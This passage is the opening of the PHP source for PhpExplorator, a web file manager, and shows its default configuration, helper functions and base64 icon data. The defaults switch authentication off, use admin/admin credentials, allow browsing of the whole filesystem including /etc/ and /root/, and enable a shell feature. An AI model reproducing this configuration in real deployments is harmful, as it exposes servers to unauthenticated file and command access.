<?php
/**
* phpexplorator.php
* --------
*/

//  ____  _  _  ____  ____  _  _  ____  __     __  ____   __  ____  __  ____
// (  _ \/ )( \(  _ \(  __)( \/ )(  _ \(  )   /  \(  _ \ / _\(_  _)/  \(  _ \
//  ) __/) __ ( ) __/ ) _)  )  (  ) __// (_/\(  O ))   //    \ )( (  O ))   /
// (__)  \_)(_/(__)  (____)(_/\_)(__)  \____/ \__/(__\_)\_/\_/(__) \__/(__\_)
/**
* begin    : July 2004 - Jun 2020
* copyright   : PhpExplorator Ver 3.0 (C) 2004-2020 T.E.H
* www     : http://phpexplorator.sourceforge.com
*
*  @license http://www.gnu.org/copyleft/gpl.html GNU/GPL
*
* Copyright (c) 2020, Tchouamou Eric Herve  <tchouamou@gmail.com>
* All rights reserved.
*
*
*
*
*
*
*
*
* phpexplorator.php,Ver 3.0 08-06-2020 12:40:00
*/
define("PE_version", "3.0");
/**
* PE_load_other_config()
*
* @param string $conf_type
* @return
*/
function PE_load_other_config($conf_type = "")
{
    $PE_mce_conf = "";
    if(!empty($conf_type)) return $PE_mce_conf;
//    ___  __   __ _  ____  __  ___  _  _  ____   __  ____  __  __   __ _
//   / __)/  \ (  ( \(  __)(  )/ __)/ )( \(  _ \ / _\(_  _)(  )/  \ (  ( \
//  ( (__(  O )/    / ) _)  )(( (_ \) \/ ( )   //    \ )(   )((  O )/    /
//   \___)\__/ \_)__)(__)  (__)\___/\____/(__\_)\_/\_/(__) (__)\__/ \_)__)
/**
*
* This will be ingnore if file [config.php] is loaded
*/
    if(!defined("config_load")){
        $PE_config["authentification_need"] = "no"; //--(url, form, no, basic, apache, 0, 1)--if require authentification
        $PE_config["my_username"] = "admin"; //--username to be use (ex:admin)
        $PE_config["my_password"] = "admin"; //--password to be use (ex:admin)
        $PE_config["challenge_need"] = "1"; //--(0, 1)--if require challenge authentification
        $PE_config["begin_path"] = "./"; //--begin path
        $PE_config["path_limit"] = "all"; //--(all, www, begin_path)--1 to phpexplorator path limt
        $PE_config["user_policy"] = "admin"; //--(guest, admin) phpexplorator can write files
        $PE_config["cookie_alive"] = 3600; // time you want session to be mantain

        $PE_config["images_url"] = "images/icons/"; //--url to icon
        $PE_config["images_path"] = $PE_config["images_url"]; //--url to icon
        $PE_config["style_file"] = "style.css"; //--folder of icon

        $PE_config["lang_path"] = "./lang/"; //--folder of languages files
        $PE_config["self_header"] = "0"; //-- activate or disactivate phpexplorator  sending http image header
        $PE_config["PE_key"] = "cmr_mode";//-- optional var to be send (usefull when integrated in other application)
        $PE_config["PE_val"] = "explore";//-- optional var value to be send (usefull when integrated in other application)



        $PE_config["PE_current_language"] = "default"; //--(italian, english, french, default)

        $PE_config["show_error"] = "0"; //--(0,1)--1 to show phpexplorator error
        $PE_config["date_format"] = "d-m-Y, H:i"; //--("Y-m-d, H:i:s")  phpexplorator date format
        $PE_config["max_num_files"] = 10000; //-- phpexplorator max num files to be elaborated
        $PE_config["personal_header"] = ""; //--phpexplorator personal header
        $PE_config["personal_footer"] = "  All rights reserved."; //-- phpexplorator personal footer

        $PE_config["show_title"] = "0"; //--(0,1)--1 to show phpexplorator title
        $PE_config["show_command_1"] = "1"; //--(0,1)--1 to show phpexplorator command_1
        $PE_config["show_command_2"] = "1"; //--(0,1)--1 to show phpexplorator command_2
        $PE_config["show_command"] = "1"; //--(0,1)--1 to show phpexplorator command
        $PE_config["show_command_upload"] = "1"; //--(0,1)--1 to show phpexplorator command_upload
        $PE_config["show_shell"] = "1"; //--(0,1)--1 to show phpexplorator shell
        $PE_config["show_email"] = "1";
        $PE_config["show_mysql"] = "1";
        $PE_config["show_replace"] = "1"; //--(0,1)--1 to show phpexplorator replace
        $PE_config["show_command_extend"] = "1"; //--(0,1)--1 to show phpexplorator command_extend
        $PE_config["show_head_dir"] = "1"; //--(0,1)--1 to show phpexplorator head_dir
        $PE_config["show_dir_list"] = "1"; //--(0,1)--1 to show phpexplorator dir_list
        $PE_config["show_footer"] = "1"; //--(0,1)--1 to show phpexplorator footer
        $PE_config["show_action"] = "1"; //--(0,1)--1 to run phpexplorator action

        $PE_config["beautifull_name"] = "0"; //--(0,1)--1 to show phpexplorator file name beautifully
        $PE_config["show_col_name"] = "1"; //--(0,1)--1 to show phpexplorator column name
        $PE_config["show_col_num"] = "1"; //--(0,1)--1 to show phpexplorator column num
        $PE_config["show_col_check"] = "1"; //--(0,1)--1 to show phpexplorator column check
        $PE_config["show_col_action"] = "1"; //--(0,1)--1 to show phpexplorator column action
        $PE_config["show_col_comment"] = "1"; //--(0,1)--1 to show phpexplorator column comment
        $PE_config["show_col_size"] = "1"; //--(0,1)--1 to show phpexplorator column size
        $PE_config["show_col_type"] = "1"; //--(0,1)--1 to show phpexplorator column type
        $PE_config["show_col_perm"] = "1"; //--(0,1)--1 to show phpexplorator column permission
        $PE_config["show_col_owner"] = "1"; //--(0,1)--1 to show phpexplorator column owner
        $PE_config["show_col_group"] = "1"; //--(0,1)--1 to show phpexplorator column group
        $PE_config["show_col_date_time"] = "1"; //--(0,1)--1 to show phpexplorator column date_time

        $PE_config["use_extend_editor"] = "0"; //--(0,1)--good editor but slow
        $PE_config["editor_compression"] = "0"; //--(0,1)--good to be fast but don't work all time
        $PE_config["editor_compression_language"] = "php"; //--(php, jsp, aspx, cfm)
        $PE_config["tinymce_path"] = ""; //--folder of tinymce files
        $PE_config["tinymce_php_file"] = "./tinymce/jscripts/tiny_mce/tiny_mce_gzip_php.js"; //--tinymce files need for php compression
        $PE_config["tinymce_jsp_file"] = "./tinymce/jscripts/tiny_mce/tiny_mce_gzip_jsp.js"; //--tinymce files need for jsp compression
        $PE_config["tinymce_aspx_file"] = "./tinymce/jscripts/tiny_mce/tiny_mce_gzip_aspx.js"; //--tinymce files need for aspx compression
        $PE_config["tinymce_cfm_file"] = "./tinymce/jscripts/tiny_mce/tiny_mce_gzip_cfm.js"; //--tinymce files need for cfm compression
        $PE_config["tinymce_js_file"] = "./tinymce/jscripts/tiny_mce/tiny_mce_gzip.js"; //--tinymce files need compression
        $PE_config["partitions"] = "a:,c:,d:,e:,f:,h:,i:,j:,/etc/,/boot/,/home/,/root/,/usr/,/usr/share/,/usr/local/,/dev/,/proc/,/bin/,/sbin/,/get_data/,/mnt/,/tmp/,/opt/,/var/,/var/log/,/var/splool/";
        $PE_config["stream_path"] = "";
        $PE_config["default_stream"] = "";
        $PE_config["encoding"] = array(
            'iso-8859-1',
            'iso-8859-2',
            'iso-8859-3',
            'iso-8859-4',
            'iso-8859-5',
            'iso-8859-6',
            'iso-8859-7',
            'iso-8859-8',
            'iso-8859-9',
            'iso-8859-10',
            'iso-8859-11',
            'iso-8859-12',
            'iso-8859-13',
            'iso-8859-14',
            'iso-8859-15',
            'windows-1250',
            'windows-1251',
            'windows-1252',
            'windows-1256',
            'windows-1257',
            'koi8-r',
            'big5',
            'gb2312',
            'utf-16',
            'utf-8',
            'utf-7',
            'x-user-defined',
            'euc-jp',
            'ks_c_5601-1987',
            'tis-620',
            'SHIFT_JIS'
            );
    }

    if(file_exists("config.php")) include("config.php"); //--configuration file

    return $PE_config;
}
//  ____  _  _  __ _   ___  ____  __  __   __ _  ____
// (  __)/ )( \(  ( \ / __)(_  _)(  )/  \ (  ( \/ ___)
//  ) _) ) \/ (/    /( (__   )(   )((  O )/    /\___ \
// (__)  \____/\_)__) \___) (__) (__)\__/ \_)__)(____/
/*=================================================================*/
function PE_translate($text)
    {
		$r_text = str_replace("_", " ", $text);
	    if(!empty($GLOBALS["PE_language"][strtolower(substr($text,0,25))]))
		$r_text=$GLOBALS["PE_language"][strtolower(substr($text,0,25))];
   return $r_text;
    }
/*=================================================================*/
/**
*
* PE_getpost()
* Take the name of an (input) and return the value of the http GET or POST var
*
* @param mixed $PE_var
* @return
*/
function PE_getpost($PE_var = "")
{
  //print_r($_GET);
    $PE_return = null;
    $PE_return = isset($_POST[$PE_var]) ? $_POST[$PE_var]: $PE_return;
    $PE_return = isset($_GET[$PE_var]) ? urldecode($_GET[$PE_var]): $PE_return;

    return $PE_return;
}
/**
* PE_pure_uri()
* Replace \\ with / and // with / in a string
*
* @param mixed $the_adress
* @return
*/
function PE_pure_uri($the_adress)
{
    return realpath($the_adress);
}

/**
* PE_icon_src()
* Receive a path to an image and return a href value usefull to call  PE_img_by_text()
*
* @param mixed $icon_src
* @return
*/
function PE_icon_src($PE_config, $icon_src = "")
{
    if(!file_exists($icon_src)){
        if(!empty($PE_config["self_header"])){
            return "?". $PE_config["PE_key"]."=".$PE_config["PE_val"]."&" . "PE_imgtext=" . urlencode(basename($icon_src, ".png"));
        }else{
            return $PE_config["images_url"];
        }
    }
    return $icon_src;
}

/**
* PE_img_by_text()
* Receive a string and send to the browser the corresponds image or an image of the string
*
* @param string $PE_imgtext
* @return
*/
function PE_img_by_text($PE_imgtext = "")
{
    if($PE_imgtext){
        switch ($PE_imgtext){
            case "spreadsheet" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1QQWFA0J2YhE+gAAAk1JREFUOMuVkt9LU2EYxz9nm2561vxV4FmKlXEIUiGRLIoKlBEUeCGZFIHdSH9FY111GzTQm1KDCq0LQ3LQhRQUaHc5zWyUDPRITVtbS885O+/pYj/s1y58rr4v7/P9vN/3fV5peHj4yfr6ei+7q8vBYHAcgFAoZO+2QqGQXSC5CiISieSVhKZp+P0KAJqmoSj+vF5jYGDgjyhFgKZpSFIOIEm59c7eWsm7FAGKX8ErewGIxWL09PQAEI1GaWltQbIl5qPzpQGGbpAhg4QEQCqVIi9Jf0+Rj1ca4HG7kb1eCq/j81UV/PiqdnRJwLau50/MtX6MPGf17h22FhaJpzO5JrmCybZWvG3t/0ng8SDLMgD26D0+zc3RdOUiZZ0qwiGRFQLDFEgOD03Ppnh0vONl/+zb/iJA13UANh6MUbOyTMONPrLpJMn4KqYQGJaNs6oWUwisThXn0uqZEfXw7SLA7XYjyzKJyDT7r57nRzxWNJpC8KH+EJuGC1NkMSQL77F61KeTff8ksDe/YRlb6NaOWVLK2dPhJvy1C8PUUWu9CMvk6OhDj+PvBGZ1Dc59DeCrQRcWuiVwqpU0N6epz65xsnEvX1IpfCvvyXg828UEgUAgN43BQd7dH+Pg9V7qDhzBdrmoPl2HqHAQ7JB4/DlNY3yR9skJKlV1XAqHw1OJROLC77OtnZlBfvMa89wJyhqq8Zy10Q1BZsNkekrQM/uKClV9cW1hIVDqfzDS3X1JX1q66U4mVefPTLltg5Blw6Uoywe7um6dGhqaAPgF9PUj6TDrLfkAAAAASUVORK5CYII=";
                break;
            case "presentation" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1gQTDigI5ocAsQAAAmVJREFUOMt9Ul1IU2EYfs7OmpOwNEM4qZsEaVrQRblaSAqBdKHSjUQYQVl6YxQaRBcWQVkajnQ3qUQXGYE/EbMfL2SUoCuKLiJ3kMJ2/DsDbUqwHbbe73xdbJOzKb0378fH8z7P+/MIZxvO3CSiDmyOHwD8AGYS2d9S7P2ahpk0E1HHQN8TKEognYABoERmANj6iBcHL94BeBzw/entE2aLxdJ/ubmxKa2YGwr1JFlLMTDvfQWOWdirbgAAzM+fvWh+0HWv6fy5C4hEIhBNJggAi2kacSI9IyuLIAjMJIrs18AhFFadxtqcG5zH2zAnJSVJgqIoWBgawm6fj+2z2XQQsUAgwFSHgwobGnQAWJ72wJrHEfsTTCUAgFVZRrmqIsNuZ3/DYYqGw7TLvI1lTU3rHxWFsvMB6VgtQj/dyTWkEoRkGbooQgsGWRSkT5yqZsNL+xmnKJW+72Mn8wHV54Ell2+MYDIS7K2uxtvRUa5qGgsdLaAdzgDLN4do5zevXlp5QAcAyVELnlxtOsH23FxIvb3CyOIi9Q8/ZmO3Olnw5X29JG+dKi81EgAsfxqLq/MtRrBarSirqEDZ+DgznNHoBUjlNViZdSOm/d5MIMt+o4nSfcAAYGnKA4ppyMzZogOn83jyqSeUydjB5Dtgj7MOK/LcphH6Ox92GN1IBvWNDpwA1M+vIWYCSFxBwH/i6rUrDluhvXh+QRnveeRe/dCew0vq27Ey04OMbAfU6YnUKxjD5eo+YrcV1bW1XR+024oKXK5uEwAEv7yBzvgGTtiisAZAF4CZ1ta2esO/eHjtLqXBB/8Bjq8iwW+iMcgAAAAASUVORK5CYII=";
                break;
            case "terminal" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1QoSFSUbRvzYGQAAAilJREFUOMt9k89LVFEUxz93fDMqZEGG0cLAEgpXrly1qEXLNu2C0mqRuggXQWCtgja1DkqwRWKC/gG1LSUIwqI0UCOdsRgrHX2Ome/dX6fFG2dGLQ8c7r3ccz/3ew7nqKHngweNsf3W2u44jhuMMVTcYmz1OXFn3XoUx4+11g8CpdT9o03Hek62tKYztXWAgPBP896xXiySX8o3jk+8vp1bzKYD4PqJltb0la5Opj9Ns5+JJOTTbafo7enN5BazPYGI1CmV4svcHKMvH+HFISJ4cXjvEUnceUHE4b2j80I/qZRCRA4FFXnC1MdZwOG9lEDJ422QF8F5C4B1yVoF8DQ2NSTB3uOxeO/wJUBstgjXlwk3CwA453YCRISpDzP09d7l2cgTlgt5BME5SyH8SRRtJoFKJR/uAXihviHDqzcvuNHVR2FtmcGRh6wVfkGNpf5AbQlAKYVdAC+e2el5Vn/8oaP9HJmglveTnxHvy49Qle2eFBAgcNzsvsXw2ABvJycI0gqoKSlXOxS43UUE+Dr7jUtXL4IIKHg3PlO+0zrmzPn28tk5v6sGgPMuqZFKAdBxtq1KukKlUvsoECiubv2/Davy31EDpZQGqW8+3szCwkK5XfezxiOHieIIpdTvANRwNjd/bWxsNNjYKBKGIWG4RhRFGGuw1mK3J9FarDVoo1lZKWjgaSDi7+SXvpPNzV82xmS01pVRNqYM2R5lrTVGm9hYOyQi9/4C16KCF5hN9R0AAAAASUVORK5CYII=";
                break;
            case "sound1" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABQAAAAWBAMAAAAyb6E1AAAAGFBMVEXM////MzP////MzMyZmZlmAAAzMzMAAAD978/hAAAAAWJLR0QHFmGI6wAAAGpJREFUeNpjYMANEhgYBSAs9gJBBkEIs6SAUQAizO5UwCAIYZYoFQgwAlWwl5c7KRUABQMZSlxclIBMVhBTCQgKAoljpqQkQbUBDTODGsaQllacBLECCNLN4BazFYOcA3FZOsKRbAinYwAArBsbpwdFPHYAAABWdEVYdENvbW1lbnQAVGhpcyBhcnQgaXMgaW4gdGhlIHB1YmxpYyBkb21haW4uIEtldmluIEh1Z2hlcywga2V2aW5oQGVpdC5jb20sIFNlcHRlbWJlciAxOTk1TOj0xAAAAABJRU5ErkJggg==";
                break;
            case "doc" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QAAAAAAAD5Q7t/AAAACXBIWXMAAA3XAAAN1wFCKJt4AAAAB3RJTUUH1QkHDR4My8+dUwAAAbZJREFUOMudkzGLIkEQhb/qHvEWNHDN/BGmBmZipJiZCEaCt/mBe5GbeYyesPEliiADBmamnomZgT/AxGB+gRjoMNNzgevseN4lFjRN0V3v1XtdLfag9xX4xQOhlPqGPeiFj4Y96IXWFc11XdbrNbvdjvl8DsBisUBrfcMaBAEAuVzu0kX8sFgs0mg0GI/H8TbRWqOUQil1LyOebLdb6vU6juMAoLXGhIYgCAhMgO8HCPJ/gLe3N6bTKdVqNQLQSmNpjdYWllYorRAlGGMAiDwQuSA3m00A+oM+rVYL13VZ/l6iDBilEGMQ80lqxbUul0tEJFrv/jtBEGBpi1CFqDDECIBEZqo4gIhEZl3z4/FIuVwmk8mQzWZ5ff3O09OXSMInwEdxHARgv99TKpU4HA60221GoxGr1Yrz+fyXiUqi4vieSCTodrskk0k6nQ4Am83m/hUEudF/NVXk4rhSitPpBIDnefcA4cflOLuI4Hketm3j+z7D4RCAQqHwjw7C8GZARIRUKkU+n2c2m5FOp5lMJtRqNSqVyv0zZp6f78bUcZzIbQDf9y/dxsgs4KX/88dD3xl4+QP+j8+Vjq02WwAAAABJRU5ErkJggg==";
                break;
            case "executable" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA3XAAAN1wFCKJt4AAAAB3RJTUUH1QQWFAc4cmrsSgAAAb1JREFUOMu1k81OE2EUhp/vm29mpE1IKIKkYDsNkAnGKGggYaMbSPAGuAA3TdywYOPOcAEumrhhwwU03oDRlXHlQqoJ2lHMDKFpC7T8ZfqHKC6UZhRmdrzJWT5PTvKeAyFZXFqdnFl4era4tDpJRGQY7Dnu+vNnj/Ecdz1KIqPgYmmHiXt2pESGwZuVGrrSuDM+TGJkKFQiL117dx9dSXRNgzPoMQwsO3OpRPwPl+qHCARCgBCCT8USpqE4Pf3JF7eK57hYdmYqn8sWAGQQrh4co2sauvoz7fYP+AWJ3ji3RpMM9/cFN5kDUOdw7biBrjSEEAgEjVaH2r7P3YmbXDMV795vIhGkB/oB8Bz3NSCkZWfml1fWuN4bp9U6wW+0+e7tsrVdp1w5pNnoUK4coaQkZhps7dXxHJfUWOo+gMznsm8sOzO1vLLGyGAfG8UyezUf3+8wlh4klUzQap4QMw2ccrULv3zx5EO3hXwuWziXPHp4m7hpEDcNjg6aSCFQQvLRK12A/6kxKHkwO07MNBhND2Dqircb3/Acl6R1YzoId2sMO6avxR1eFT5fqC5SEJT8rSwUjkzgG+e4yvwGH5vwRFJ4Rk0AAAAASUVORK5CYII=";
                break;
            case "html" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1QQWFBMzy8WilwAAAlJJREFUOMuVkr1PU1EYxn/n9tIrUGx6gUIhQqx8SIiAGBwcjERdMCEmDkZl0U3j6KIxIV38BwwmGKODHwMxLurg5GBcQCYhpi0BTa0U6O2HLfe2t+29DqbYK8aEZ3pP8p7n/N7zvGJ2dvZlIpG4wN50cXp6eg6AUChk71WhUMiuOsnVQtM0LMsCQAix81S1FkLgcrnwer0OlB0Dy7KIRCKOC7USQjAwMLBrFrn20N/f/1+Cf0mubawlqOrzWoalr1myhkXZsnHLElKpnct3nl19cW/qiYOgr69vx+D75k8evlog0KYyeeYYBzubaVAU0nmDldgWi8uxx5duP73uMIhGowAkUgavFzY4Pz7McK+fdN5gNfoF2eOHeh9N++DKxAjzy/ExxwhVgrlH75k8NcSRoEoqmaClaxBvSwC9UCIRW0W2TKSKwemxoPMTI5EIn8IaPt9+xsd6yGU0yrIHJEGdJOOus2lQZHwNCgF/K4ri3p3C28WPnBjtIpNOkjQb8Xd0YNtgAwgJYZmspywWV5bw1dvOFMLhMAlNp7vdx3x0k2CvH8uGai75TIrjI4MIIbBtm/j6BtLfBAWzjKK4kTx+MvkCWzkTvVghp5uY+S3HXrS1Nv8hUFX192LIEtntAo2FH3hkhc3tFpJ1bsoVi0KqzEipRLFo0uRpRNd1xMzMzJtkMnmuahS3DnH25DBHe1SCBwJ8i8X5sGJg4sYolslmUiiiwo3JITRNY9d+Xrv7/H57QL05NTHK4e5WANKZLA/erVHBxXbBxDBMbk10ksvl+AWD+hkUofZ2KAAAAABJRU5ErkJggg==";
                break;
            case "help1" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABQAAAAWBAMAAAAyb6E1AAAAD1BMVEXM//////+ZmZkzMzMAAADr3BzJAAAAAWJLR0QEj2jZUQAAAGBJREFUeNptzu0NgCAMRdGuUHABCANAYAHx7T+TbfnQRO+v44MYqFqZpMKS9w85GyNwsc7FQamzEa014YFuX8aTgZjGH9ymnvNgAvqkjGEz8CYvWp/1n6+7izWO5JGEGd3GGBy7/dylDQAAAFZ0RVh0Q29tbWVudABUaGlzIGFydCBpcyBpbiB0aGUgcHVibGljIGRvbWFpbi4gS2V2aW4gSHVnaGVzLCBrZXZpbmhAZWl0LmNvbSwgU2VwdGVtYmVyIDE5OTVM6PTEAAAAAElFTkSuQmCC";
                break;
            case "bomb" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA3XAAAN1wFCKJt4AAAAB3RJTUUH1QwDARgOPQO6ugAAAZNJREFUOMudk71SGzEUhT/J9hriPEDGBTCTN2B4Axc0FHQ01KFPCbUzjtN7Jn3SU/IuTIoQ90S7lvfPq5Nis2vIuonV6M5I57v3niuZ2Xz6AfjKHsta+5HZfKp912w+Vb+hLZfL/8o+Ho8BaAEqinovSyhLqCoUAkgYa6HXg34f0+/DYNCCtgDva3FRQFliJIwECIwFa1BvUIuH0Q7AagVZBkXB8fk5AE/39wAcXV4C8OvhAUURGr0hhPAPYL0Gv8LmRUtvhO2dOIYowlqznUQTmDSF3zFyjp+LRce0p8UC4xzEMawzqqp6XQFpipK4biPPOwA9P6MowhweYkZv2xbaCvAekgQ5x8ntbQdwfHeHnCM4h9ae/G+SrQdZSogTzNq3oh/X14B4/+07AME5zGYDabpjCmmG/AolCY9XVyhN63ECjxcXmIMDzGgEIaAs2wHI8/otrGpI8L72QsI0vUtYa18BWg+Gp6eogUkgIYk6VHMAEsOzs24F7yYTmEw65jVuA2w2mzZ+aeLN5y+f9vrOwM0fpocVsnebVZ4AAAAASUVORK5CYII=";
                break;
            case "link" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABQAAAAWBAMAAAAyb6E1AAAAFVBMVEXM////MzP///+ZmZlmAAAzMzMAAABgX88jAAAAAWJLR0QGYWa4fQAAAGBJREFUeNpNzsENwCAIQFFW0DgBrV3ApPeaDmBMdAT2H6FgRfynFxII0EYFuIpcjEYsxmiU8eDVe1cS0SQe6Vai8vSISrfRDz5O2uiNWfhyLthaXgx2LC9KzJb++EmgGXySDiQUgmrejwAAAFZ0RVh0Q29tbWVudABUaGlzIGFydCBpcyBpbiB0aGUgcHVibGljIGRvbWFpbi4gS2V2aW4gSHVnaGVzLCBrZXZpbmhAZWl0LmNvbSwgU2VwdGVtYmVyIDE5OTVM6PTEAAAAAElFTkSuQmCC";
                break;
            case "quill" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1gEGFgQD9XZoggAAApVJREFUOMutk01sDGEYx38zs7O1SLfMLMGBVtCJ4KCJg6C4NHEgUkmJr2NLilpBpEQQgooica1EE8Q2EtGDS320REiJj52lRWJbldRud2c/ul27O68DO2kvTv7Jkzzvm/x/eZ43/1dinPYdaNQ0TYsUz9FoVL/aei3KPyQVG/+hA2tLvWVdS1bUiBRTJVWMib6XD6SEFV93qaX10T8Bjfv3arruiyysqmEg7WHl4lmY4RjpZAIr1InLpaAosmNSVTXgbzq8BcAFoOu+SPnilXyxSqhbXc4kt4KqyHSHBDOWbGD4fSfHjjY7gPMXz9YWe5dzO9nHvOmlFGxBNlcgm7PxlZbwdWgMCbCsOABebxklb45zeassgB3OXGohweBwgnAkQzydZ47mwS0X0KfYAIRCIQBatynsutJDde1+gJsyQMKKr+t73cXMUglzYISR1BgvzO/EUhmi7++zaeMmDMOgrUFj99VnDD5t5505WACQAaaVTe+qKJ9P+NU9Knwl9IR+khzNMvy6A13TGE2POuaBJzd51x9lxOxQgCrpzJlTYu68cny6TtAMkkqnnGdZtnQZ1WuqaWvQ2Hmpm3BPO28/RYmZAYCqplt2rwtwzAeb/FhW3NkX+GNueUr/wzY+fk8SMwP8WlTPkZPXewFJbm4+IQXNIPnCL7toMgwDwzCorKzkm7yC4PPn9A9ZxIJ3qTv9Atsz28mQDOA/eEgCEMJhIITgxh6dzz+i3AkEiHzoYFV9B5O0BeRyuWIEhDwulXY+n58AaLpls37mZ2o272Z5w2PE5Dkkk0lyuTyAMjFIgKq68XrdDiCTyZBIJMhmsyiKgqqqf8sFYE8AKIpy+0LLue1CiAlTFEuSnH+Hx+NpB3L8D/0Gec0bDM69rVkAAAAASUVORK5CYII=";
                break;
            case "system" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1QsECzcg0anuZwAAAB10RVh0Q29tbWVudABDcmVhdGVkIHdpdGggVGhlIEdJTVDvZCVuAAAB2UlEQVQ4y8WTTWsTYRSFn2lrgzSdNCOhJkM3gcbdhGRCSIpYdSU1WYkIFQQhZP5BEVx1IYgrETct/QOlLQhDslEMWEGRvPmYooLbJJSJNCVZtIgfcWFnSNt01YV3dXnP5XDvOeeFc5Z0FvD02ZO+0z9aenzm3JjT3L13J6PrcRNAiEoWIJ8zWF1bOYadJHMJdD1u5nMGlmUBmKGgSstuEAqqoGOmkmk0TQPoD5KMDbJZlsWlaT+3swvuWywRJUbUxU/WqNP4Fb/40/+9GLkyS6vRYvvddq9ttz071k5vyjflmfBOUCqVEKKS/fL567djGziChYIqALVarWfb318JUd1UFOWqJI0+XMjcCjjn6Hrc1WLEYcrnDGKJf6v6fD652WxubqxvmZ1O570sewPOOfmcMdyF1bUVQkGVWCLKwcHh4dxcegkgHA4b3W63B8jVcp3CbvG0Bm9ev132K34xOeldvHHtJj9//bjQbrcDkcjsA0ni8vz1eXncM05FVBCikn3x/OX9oTamkmladgN1RkWdUS8eQbIzk0qmAcyN9S3XxpHBdTRNY8/ep2AWqZbrAFTLdQpmkT1738nBcA2OVO27SdQxM9MZCrtFJ5nmx08fTiXx3H/h/9dfs1mvKwIMuy0AAAAASUVORK5CYII=";
                break;
            case "folder" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QAAAAAAAD5Q7t/AAAACXBIWXMAAA3XAAAN1wFCKJt4AAAAB3RJTUUH1QsKEjkN+d1wUAAAAX9JREFUOMulkU2IUlEYhp9jKv5AposQWgRBtA6CmSCa5SzjYhG0qYggiP6Y3WxmtrMIol1QM84qRKRlSVC2bBcYRpuIIigFC7F7j0fP/WZx7QriBc2XDw6cw/e8L+9Rly6XtorF4jZTMsYE58Dc2tvdf0KE1J17t+X61RszH7X2eLb3lF6vd6VaqT2PBJSci7Q+taJMeNt4M331qFqpPQCIA6TTGY7k8pEA50IpcFMKpRS1F9X7QAAwxuB5Lq8/9ml2Msylww5nbjpSSOnPYYJmJ8PjjXW0sXMxUslD3H1YPxUH8DwXgJ+/NV/af+cCnDiaBSCmtSadnjP6DMVc1w0T/BfgXwdLARZNYK2PHgZlh7+QiPkIICIopRARRMAXwVphaH3MSBiMLEMr5LLJCcDzXI7nBnT7hh9dD0ThI4wHERAEkTEYGFmZAH512pw+e44PX/+MlwJ3EfARBAUiYaqVkwXqL1+R19/L6vy1nYabOLa2aHnZ4bf378qbqyyrA8KHtMqnsOL4AAAAAElFTkSuQmCC";
                break;
            case "image1" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QAgACAAIBEKJNNAAAACXBIWXMAAA3XAAAN1wFCKJt4AAAAB3RJTUUH1QUbCyk51smA0AAAAhFJREFUOMudkztoVEEUhr9zziy5m5tdA2p8oGgiQbEIpFEEUbAVK4lBFEQlSNAYERSTYgULW/GBD0QQK7Wx0M4qjWJjs5WFRUARk911N0t01707Y3GT2ESImWaY4p/5Ps4/wirWvj27poADkCCrCH/ff/BwTz7fTX2uhP7vBaLaE8c5isUivxp+ZQR7BzcH0QgIuEzEt9mfN/r6dhQGBgaRoeGjQURxzjBnOHXp7hzlcoVatUaj8pEQ7b4JkMvlkmw2W6hUKohIqvDiyjVUlWdjlxFTHp87j6jy8uoEqopzgUd3hicf3j42WZg4Urg4eoitWzaxccN6ZPj4UDAznDnMOZwZ5hxmRrlcplat4evvufvgHh/evWZnfwf9vQ1mv7zi7VSCqgqqipqgpogqqoqpoiqICnGU0Gq1mKtNk3FN2sk81fltADjvAyIe31ZEPIrgvactgveB4ANd2YRMRlFbRyvpIIoC3fE0wMoIAFqJx7dLZFyTRuMvgYoYqoaooaKYpUFVRUVRhLX5JoTlR+wWA4svqqQEqikNknbtnwopsi2EbElBbIHAWFQIyyqYKE9GL6Ci3D8zgqly68QpVJSnY+MIig/WjqJY4riLer3Jp89Gtqs3rfbZkdNLPXAL8zeXnmdmZ6iUq2yP3/jx68/1R+mr74zXSNSZl6Sdp1QqrewvXDrp2sBvH3ACJoKAB+API0Gz8DSo/XIAAAAASUVORK5CYII=";
                break;
            case "movie" : $imgtext = "iVBORw0KGgoAAAANSUhEUgAAABQAAAAWBAMAAAAyb6E1AAAAFVBMVEXM///////MzMyZmZlmZmYzMzMAAACJEDptAAAAAWJLR0QGYWa4fQAAADlJREFUeNpjSIOCBAaGJDUwSykVxHQBAjEQMy3N2djYWCwNLApmKqEyiVAgCARQBfS1As5kDYUCBgBmJTTqIcTrXgAAAFZ0RVh0Q29tbWVudABUaGlzIGFydCBpcyBpbiB0aGUgcHVibGljIGRvbWFpbi4gS2V2aW4gSHVnaGVzLCBrZXZpbmhAZWl0LmNvbSwgU2VwdGVtYmVyIDE5OTVM6PTEAAAAAElFTkSuQmCC";
